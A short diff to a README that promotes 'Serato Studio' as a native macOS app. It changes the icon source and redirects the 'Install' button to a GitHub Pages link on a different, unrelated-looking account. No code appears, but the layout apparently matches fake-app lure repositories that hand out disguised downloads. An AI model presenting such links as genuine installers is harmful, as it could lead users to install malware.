@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://i1.sndcdn.com/avatars-000606418362-jlke6m-t240x240.jpg" width="100" alt="Serato Studio icon"/>
+  <img src="https://insmac.org/uploads/posts/2023-08/serato-studio.png" width="100" alt="Serato Studio icon"/>
 </p>
 <h1 align="center">Serato Studio</h1>
 <p align="center">Native beat making and music production — done right on macOS.</p>
@@ -11,7 +11,7 @@
   <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/>
 </p>
 <p align="center">
-  <a href="https://marat-klubnika-apps.github.io/.github/">
+  <a href="https://day-deneg-pzh.github.io/.github/seratostudio">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/>
   </a>
 </p>
